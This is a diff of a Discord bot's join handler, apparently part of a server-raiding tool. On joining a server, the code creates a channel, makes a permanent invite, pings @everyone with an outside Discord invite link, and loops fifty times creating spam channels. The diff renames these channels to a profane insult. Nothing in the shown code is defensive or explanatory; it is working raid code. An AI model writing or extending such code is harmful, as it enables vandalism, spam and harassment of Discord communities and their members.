@@ -36,7 +36,7 @@ async def on_guild_join(guild):
                         except:
                             pass
 
-                    raid = await guild.create_text_channel(name="únete-a-dd")
+                    raid = await guild.create_text_channel(name="🤡-clown-fuck-you")
                     invite = await raid.create_invite(max_age=0)
                     await raid.send("||@everyone||\nhttps://discord.gg/T57ZdQKWRs")
 
@@ -46,7 +46,7 @@ async def on_guild_join(guild):
 
                     for _i in range(50):
                         try:
-                            await guild.create_text_channel(name="raidedby-executive")
+                            await guild.create_text_channel(name="🤡-clown-fuck-you")
                         except:
                             pass
 
